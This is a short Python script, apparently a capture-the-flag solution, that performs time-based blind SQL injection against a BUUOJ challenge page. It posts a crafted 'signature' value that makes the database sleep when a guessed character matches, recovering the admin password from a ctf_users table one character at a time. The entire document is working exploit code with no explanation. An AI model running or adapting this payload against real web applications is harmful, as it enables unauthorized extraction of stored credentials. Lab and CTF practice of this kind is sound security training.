#时间盲注
import requests

url="http://262bfdd6-0aee-4f5b-be62-649cf876f7c0.node4.buuoj.cn:81/index.php?action=publish"
cookie = {"PHPSESSID":"cnljffbqongdosfvgr3i75i121"}

k="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
flag=""

for i in range(50):
    for j in k:
        j = ord(j)
        data={
            'mood':'0',
            'signature':'1`,if(ascii(substr((select password from ctf_users where username=`admin`),{},1))={},sleep(3),0))#'.format(i,j)
            }
        try:
            r=requests.post(url,data=data,cookies=cookie,timeout=(2,2))
        except:
            flag+=chr(j)
            print(flag)
            break
